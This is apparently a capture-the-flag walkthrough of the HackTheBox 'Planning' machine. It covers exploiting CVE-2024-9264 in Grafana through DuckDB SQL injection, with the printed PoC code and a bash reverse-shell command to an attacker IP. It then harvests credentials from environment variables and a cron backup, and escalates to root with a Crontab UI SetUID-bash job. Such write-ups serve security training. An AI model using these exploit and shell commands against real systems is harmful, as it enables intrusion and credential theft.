Planning offers a Grafana instance that’s vulnerable to a CVE in DuckDB that is an SQL injection that can lead to remote code execution. I’ll abuse that to get a shell as root in the Grafana container. I’ll find creds in an environment variable, and use them to pivot to the host over SSH. There I’ll find an instance of Crontab UI. I’ll get creds from a backup cron, and use it to make my own cron as root to get execution. In Beyond Root I’ll dig into the Grafana Swagger UI and the Crontab UI configuration.

### Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

```

Based on the [OpenSSH and nginx version](about:/cheatsheets/os#ubuntu) versions, the host is likely running Ubuntu 24.04 noble.

The website is redirecting to `planning.htb`.

### Initial Credentials

This box is meant to simulate a web application pentest, where it is common to have an account on the application to completely test it. The site says:

As is common in real life pentests, you will start the Planning box with credentials for the following account:  
admin / 0D5oT70Fq13EvB5r

It’s not immediately obvious what these creds are good for. They don’t work for SSH:

```
oxdf@hacky$ netexec ssh 10.10.11.68 -u admin -p '0D5oT70Fq13EvB5r'
SSH         10.10.11.68     22     10.10.11.68      [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.11
SSH         10.10.11.68     22     10.10.11.68      [-] admin:0D5oT70Fq13EvB5r
```

I’ll have to keep these in mind for when I find a place to use them.

### Subdomain Brute Force

Given the use of host-based routing, I’ll use `ffuf` to brute force for any subdomains of `planning.htb` that might respond differently, but using my default wordlist, none turn up.

After enumerating a bit more and finding nothing interesting, I’ll come back and try again with larger wordlists, and find a subdomain:

```
oxdf@hacky$ ffuf -u http://10.10.11.68 -H "Host: FUZZ.planning.htb" -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -ac

I’ll add `planning.htb` and `grafana.planning.htrb` to my local `/etc/hosts` file:

```

```

### planning.htb - TCP 80

#### Site

The site is for an online education platform:

 ![image-20250510152808658](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250510152808658.webp)![expand](/icons/expand.png)

There are a few pages without much of interest, like About and Courses. The “Contact” page also has a form:

![image-20250510153826297](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250510153826297.webp)

I can see in Burp that submitting this form doesn’t even submit data to the site, so it’s not interesting.

There’s a “Course Detail” page that doesn’t have anything interesting. The “Enroll” page has a form:

![image-20250510153805809](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250510153805809.webp)

Submitting this does POST the data:

```
POST /enroll.php HTTP/1.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0

And shows a message:

A bit of poking at this form doesn’t show any interesting ways forward.

#### Tech Stack

The URLs for the various pages show that the site is PHP.

The 404 page is the [default nginx 404](about:/cheatsheets/404#nginx):

![image-20250510154116863](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250510154116863.webp)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```
oxdf@hacky$ feroxbuster -u http://planning.htb -x php --dont-extract-links

```

I also use `--dont-extract-links` because otherwise a bunch of static junk shows up. Nothing interesting.

### grafana.planning.htb

#### Site

This subdomain offers a [Grafana](https://grafana.com/) login page:

![image-20250510174803400](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250510174803400.webp)

I’ll try the provided creds and they work:

![image-20250510174927871](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250510174927871.webp)

There are no dashboards. I don’t see anything interesting in the settings.

#### Tech Stack

The login page footer says it’s version 11.0.0:

![image-20250510175108512](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250510175108512.webp)

I’ll skip the directory brute force since it’s a known open-source application. If I did, I would find `/swagger-ui`, which isn’t important to solving the box, but I’ll take a peak in [Beyond Root](#grafana-swagger).

## Shell as root in Container

### CVE-2024-9264

#### Identify Exploit

Searching for vulnerabilities in this release of Grafana shows a few things, but the most common is CVE-2024-9264:

![image-20250510175327387](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250510175327387.webp)

#### Background

Nist [describes](https://nvd.nist.gov/vuln/detail/cve-2024-9264) this CVE as:

> The SQL Expressions experimental feature of Grafana allows for the evaluation of `duckdb` queries containing user input. These queries are insufficiently sanitized before being passed to `duckdb`, leading to a command injection and local file inclusion vulnerability. Any user with the VIEWER or higher permission is capable of executing this attack. The `duckdb` binary must be present in Grafana’s $PATH for this attack to function; by default, this binary is not installed in Grafana distributions.

If DuckDB is installed and in the `$PATH` variable, then I can exploit a SQL injection vulnerability to get RCE.

### Exploit

#### POC

There is a nice [POC](https://github.com/nollium/CVE-2024-9264) from nollium on GitHub. I’ll clone the repo:

```
oxdf@hacky$ git clone https://github.com/nollium/CVE-2024-9264
Cloning into 'CVE-2024-9264'...
remote: Enumerating objects: 67, done.
remote: Counting objects: 100% (67/67), done.
remote: Compressing objects: 100% (56/56), done.

Resolving deltas: 100% (38/38), done.
oxdf@hacky$ cd CVE-2024-9264
```

To run with uv (see my [uv cheatsheet](about:/cheatsheets/uv#) for details), I’ll add the requirements as inline meta:

```
oxdf@hacky$ uv add --script CVE-2024-9264.py -r requirements.txt     
Updated \`CVE-2024-9264.py\`
```

And now it runs (including installing 18 requirements into a `uv` -managed virtual environment in 18ms):

```
oxdf@hacky$ uv run CVE-2024-9264.py
Installed 18 packages in 18ms
usage: CVE-2024-9264.py [-h] [-u USER] [-p PASSWORD] [-f FILE] [-q QUERY] [-c COMMAND] url
CVE-2024-9264.py: error: the following arguments are required: url
```

I’ll give it the username, password, and `-c id` to run `id`:

```
oxdf@hacky$ uv run CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c id http://grafana.planning.htb
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: id
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('id >/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
uid=0(root) gid=0(root) groups=0(root)
```

It works! Grafana is running as root.

#### Exploit Breakdown

I’ll always get a basic understanding of how an exploit works before running it, but I’m including this after showing an initial run because it’s nice to have the output to see how it works.

The exploit is using the [ten](https://github.com/cfreal/ten) exploit framework, which uses decorators to get parameters and log.

At the bottom, the `main` function handles the parameters and authenticates:

```python
@entry
@arg("url", "URL of the Grafana instance to exploit")
@arg("user", "Username to log in as, defaults to 'admin'")
@arg("password", "Password used to log in, defaults to 'admin'")
@arg("file", "File to read on the server, defaults to '/etc/passwd'")
@arg("query", "Optional query to run instead of reading a file")
@arg("command", "Optional command to execute on the server")
def main(url, user="admin", password="admin", file=None, query=None, command=None):
    """Exploit for Grafana post-auth file-read and RCE (CVE-2024-9264)."""
    if sum(1 for x in [file, query, command] if x is not None) > 1:
        failure("Cannot specify more than one of: file, query, or command arguments.")

    session = ScopedSession(base_url=url)
    authenticate(session, user, password)
```

Then, if `command` is given, it calls `execute_command` and outputs the result:

```python
if command:
    msg_success(f"Executing command: {command}")
    output = execute_command(session, command)
    if output:
        console.file.flush()
        console.stderr = False
        bin_print(output)
    return
```

The `README.md` says that command execution only works for v11.0.0, but that’s what is running on Planning, so I’ll focus here.

`execute_command` runs a SQL injection using the DuckDB `shellfs` [extension](https://duckdb.org/community_extensions/extensions/shellfs.html), which “Allow(s) shell commands to be used for input and output”:

```python
def execute_command(session: ScopedSession, command: str) -> Optional[bytes]:
    """Execute a command and return its output using shellfs."""
    tmp_file = "/tmp/grafana_cmd_output"
    # Install and load shellfs if not already loaded
    full_query = (
        "SELECT 1;"
        "install shellfs from community;"
        "LOAD shellfs;"
        f"SELECT * FROM read_csv('{command} >{tmp_file} 2>&1 |')"
    )

    # Execute command and redirect output to a temporary file
    run_query(session, full_query)
    
    # Read the output file using the common function
    return read_remote_file(session, tmp_file)
```

It writes the result to a file and then reads it out. So when I run the exploit, I can see it runs two SQL injections. The first executes the command saving the results to a file, and the second reads the content of that file:

```
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('id >/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
uid=0(root) gid=0(root) groups=0(root)
```

#### Shell

I’ll run the exploit again, this time giving it a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) instead of `id`:

```
oxdf@hacky$ uv run CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c 'bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"' http://grafana.planning.htb
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"
⠇ Running duckdb query
```

It hangs on the first query, but there’s a shell at my listening `nc`:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.68 37708
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@7ce659d667d7:~#
```

I’ll upgrade my shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```
root@7ce659d667d7:~# script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.

```

## Shell as enzo

### Enumeration

#### Container

I’m already root, and there’s no flags to be found. The hostname is a typical Docker hostname, 12 hex characters. There’s a `.dockerenv` file at the system root (always a good signal that this is a container):

```
root@7ce659d667d7:/# ls -a
.           bin   etc   lib32   media  proc  run.sh  sys  var
..          boot  home  lib64   mnt    root  sbin    tmp
.dockerenv  dev   lib   libx32  opt    run   srv     usr
```

`ifconfig` and `ip` are not installed, but `fib_trie` shows the IP of 172.17.0.2 (which is different from the 10.10.11.68 I’ve been interacting with):

```
root@7ce659d667d7:/# cat /proc/net/fib_trie
Main:
...[snip]...
           |-- 172.17.0.0
              /16 link UNICAST
           |-- 172.17.0.2
              /32 host LOCAL
...[snip]...
```

The OS is Ubuntu 22.04:

```
root@7ce659d667d7:/# cat /etc/lsb-release  
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=22.04
DISTRIB_CODENAME=jammy
DISTRIB_DESCRIPTION="Ubuntu 22.04.4 LTS"
```

This is different from the 24.04 I guessed based on the `nmap` results. This actually isn’t inconsistent, as both SSH and nginx are likely running on the host, and nginx is handling connections, reading from the container when it gets requests. That’s why the TTL to Grafana isn’t less than SSH, even though the end site is one further hop away.

#### Environment Variables

`env` will show the environment variables for the current process:

```
root@7ce659d667d7:/# env
AWS_AUTH_SESSION_DURATION=15m
HOSTNAME=7ce659d667d7
PWD=/
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_HOME=/usr/share/grafana
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
HOME=/usr/share/grafana
AWS_AUTH_EXTERNAL_ID=
SHLVL=3
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
OLDPWD=/usr/share/grafana
```

My shell is running as a child of the DuckDB process, so I inherit all it’s variables. There’s a username and password in there as `GF_SECURITY_ADMIN_PASSWORD` and `GF_SECURITY_ADMIN_USER`.

### SSH

The password works over SSH on the host:

```
oxdf@hacky$ netexec ssh planning.htb -u enzo -p 'RioTecRANDEntANT!'
SSH         10.10.11.68     22     planning.htb     [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.11
SSH         10.10.11.68     22     planning.htb     [+] enzo:RioTecRANDEntANT!  Linux - Shell access!
```

I’ll get a shell:

```
oxdf@hacky$ sshpass -p 'RioTecRANDEntANT!' ssh enzo@planning.htb
Warning: Permanently added 'planning.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)
...[snip]...
enzo@planning:~$
```

It is running Ubuntu 24.04. I’ll grab `user.txt`:

```
enzo@planning:~$ cat user.txt
91ee01e5************************
```

## Shell as root

### Enumeration

#### Users

The enzo user’s home directory is pretty empty:

```
enzo@planning:~$ find . -type f
./user.txt
./.ssh/authorized_keys
./.cache/motd.legal-displayed
./.profile
./.bash_logout
./.bashrc
```

enzo is the only use with a home directory in `/home`:

```
enzo@planning:/home$ ls
enzo
```

And the only non-root user with a shell set:

```
enzo@planning:~$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
enzo:x:1000:1000:Enzo Yamada:/home/enzo:/bin/bash
```

#### Web

`/etc/nginx/sites-enabled` has a single config file, `default`, that defines the two sites. The first `server` handles redirects based on hostname to `planning.htb`, and serves files from `/var/www/web`:

```nginx
server {
    listen 80;
    server_name planning.htb;

    if ($host != "planning.htb") {
        return 301 http://planning.htb$request_uri;
    }

    root /var/www/web;
    index index.html index.htm index.php;

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php8.3-fpm.sock;
    }

    location / {
        try_files $uri $uri/ =404;
    }

    access_log /var/log/nginx/access.log combined;
    error_log /var/log/nginx/error.log;
}
```

The second handles a redirect to the Grafana container on port 3000 for `grafana.planning.htb`:

```nginx
server {
    listen 80;
    server_name grafana.planning.htb;

    location / {
        proxy_pass http://grafana.planning.htb:3000/;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

The PHP source files for the main site are in `/var/www/web`:

```
enzo@planning:/var/www/web$ ls
about.php  contact.php  course.php  css  detail.php  enroll.php  img  index.php  js  lib  scss
```

Nothing super interesting there.

#### /opt

`/opt` has an interesting directory:

```
enzo@planning:/opt$ ls
containerd  crontabs
```

`containerd` is part of Docker (and inaccessible to enzo), but `crontabs` has a single file:

```
enzo@planning:/opt/crontabs$ ls
crontab.db
enzo@planning:/opt/crontabs$ file crontab.db 
crontab.db: New Line Delimited JSON text data
```

It’s JSON data:

```
enzo@planning:/opt/crontabs$ cat crontab.db | jq .
{
  "name": "Grafana backup",
  "command": "/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz",
  "schedule": "@daily",
  "stopped": false,
  "timestamp": "Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740774983276,
  "saved": false,
  "_id": "GTI22PpoJNtRKg0W"
}
{
  "name": "Cleanup",
  "command": "/root/scripts/cleanup.sh",
  "schedule": "* * * * *",
  "stopped": false,
  "timestamp": "Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740849309992,
  "saved": false,
  "_id": "gNIRXh1WIc9K7BYX"
}
```

It seems to be data about two processes that run on cron (periodically). The first is saving the Docker container once a day. The other runs `cleanup.sh` from `/root/scripts` every minute.

There is a password used for the Zip archive in the backup, “P4ssw0rdS0pRi0T3c” (it doesn’t work with `su` to become root).

#### Listening Ports

There are a handful of TCP ports listening only on localhost:

```
enzo@planning:~$ netstat -tnl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN

tcp6       0      0 :::22                   :::*                    LISTEN
```
- 53 is almost certainly DNS.
- 3306 and 33060 are likely database related.
- 3000 is Grafana.
- That leaves 8000 and 43351 unknown.

43351 returns 404:

```
enzo@planning:~$ curl -v localhost:43351
* Host localhost:43351 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:43351...

* Connection #0 to host localhost left intact
404: Page Not Found
```

8000 returns 401 Unauthorized, asking for HTTP basic auth (see the `WWW-Authenticate` header):

```
enzo@planning:~$ curl -v localhost:8000
* Host localhost:8000 was resolved.
* IPv6: ::1

```

I’ll look at how this is configured in [Beyond Root](#crontab-ui-config).

### Crontab UI

#### Tunnel

I’ll make an SSH tunnel using `-L 9001:localhost:8000`. This will tunnel any packet to 9001 on my host through the SSH session and out to localhost port 8000 on Planning. I’m using 9001 because 8000 is already busy on my host.

Now I can load the page in my browser by visiting `http://localhost:9001`:

![image-20250511153704670](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250511153704670.webp)

#### Access

I have a two passwords and two usersnames to this point. On trying root with the password from the zip, “P4ssw0rdS0pRi0T3c”, I’m allowed access:

![image-20250511153800873](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250511153800873.webp)

It’s an instance of [Crontab UI](https://github.com/alseambusher/crontab-ui).

#### Exploit

This almost certainly has to be running as root. I’ll try making a new cron by first hitting the “New” button:

![image-20250511154141239](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250511154141239.webp)

I’ll fill out the top two fields:

![image-20250511154218387](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250511154218387.webp)

This command should create a copy of `bash` and set it as SetUID / SetGID. I’ll save and it shows up in the main list:

![image-20250511154251545](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250511154251545.webp)

I’ll click “Run now” rather than wait for the minute to pass, and then the trash can to delete it covering my tracks. It worked:

```
enzo@planning:~$ ls -l /tmp/0xdf 
-rwsrwsrwx 1 root root 1446024 May 11 19:45 /tmp/0xdf
```

I’ll run this with `-p` to not drop privs, and get a root shell:

```
enzo@planning:~$ /tmp/0xdf -p
0xdf-5.2#
```

And the root flag:

```
0xdf-5.2# cat root.txt
d46c6e5e************************
```

## Beyond Root

### Grafana Swagger

#### Identify

Grafana documents it’s API with a Swagger page at `/swagger-ui`. I could find that in [the documentation](https://grafana.com/docs/grafana/latest/developers/http_api/#http-api-reference) or by brute forcing directories on the Grafana site. Swagger is an interactive documentation where I can log in and execute queries against the various endpoints.

[![image-20250511163033687](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250511163033687.png)](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250511163033687.png)

[*Click for full image*](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250511163033687.png)

There’s a ton in here. I’ll click “Authorize” and give the creds given at the start.

#### Settings

The `/admin/settings` endpoint will dump a large JSON blob with all the settings:

![image-20250511163203837](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250511163203837.webp)

The `database` section shows both a port of 3306 (MySQL) and that it’s using SQLite (the latter takes priority):

```json
"database": {
...[snip]...
    "host": "127.0.0.1:3306",
...[snip]...
    "name": "grafana",
    "password": "",
    "path": "grafana.db",
...[snip]...
    "type": "sqlite3",
    "url": "",
    "user": "root",
    "wal": "false"
  },
```

There’s a list of plugins:

```json
"plugins": {
  "allow_loading_unsigned_plugins": "",
  "app_tls_skip_verify_insecure": "false",
  "cdn_base_url": "",
  "disable_plugins": "",
  "enable_alpha": "false",
  "forward_host_env_vars": "",
  "hide_angular_deprecation": "",
  "install_token": "",
  "log_backend_requests": "false",
  "plugin_admin_enabled": "true",
  "plugin_admin_external_manage_enabled": "false",
  "plugin_catalog_hidden_plugins": "",
  "plugin_catalog_url": "https://grafana.com/grafana/plugins/",
  "public_key_retrieval_disabled": "false",
  "public_key_retrieval_on_startup": "false"
},
```

The `security` section has a username:

```json
"security": {
    "admin_email": "admin@localhost",
    "admin_password": "*********",
    "admin_user": "enzo",
...[snip]...
  },
```

`expressions` is enabled (which is a prerequisite for CVE-2024-9264):

```json
"expressions": {
  "enabled": "true"
},
```

#### Other Endpoints

There are many other endpoints, though none of them are super helpful on this scenario. Things like being able to create and modify users:

![image-20250511163854495](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250511163854495.webp)

These are worth noting, even if not useful here.

### Crontab UI Config

So where is the password for Crontab UI set if it’s not using the system root password? It’s using HTTP basic auth. If this were Apache I would look for an `.htaccess` file, but not on nginx. Looking at the `README` on GitHub, it says these are set in environment variables:

![image-20250511162512110](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250511162512110.webp)

If it’s running as a service, then I can look at the service files in `/etc/systemd`. I’ll `grep` for the port:

```
enzo@planning:/etc/systemd$ grep -r 8000 .
grep: ./system/crontab-ui.service: Permission denied
```

It doesn’t find anything, but enzo is also blocked from reading `crontab-ui.service`, which is almost certainly it!

As root, I can confirm:

```
0xdf-5.2# cat system/crontab-ui.service 
[Unit]
Description=Crontab UI Service
After=network.target

[Service]
Type=simple
Environment="BASIC_AUTH_USER=root"
Environment="BASIC_AUTH_PWD=P4ssw0rdS0pRi0T3c"
Environment="CRON_DB_PATH=/opt/crontabs"
ExecStart=/usr/bin/crontab-ui
Restart=always
User=root
Group=root

[Install]
WantedBy=multi-user.target
```

The username and password are set as environment variables.
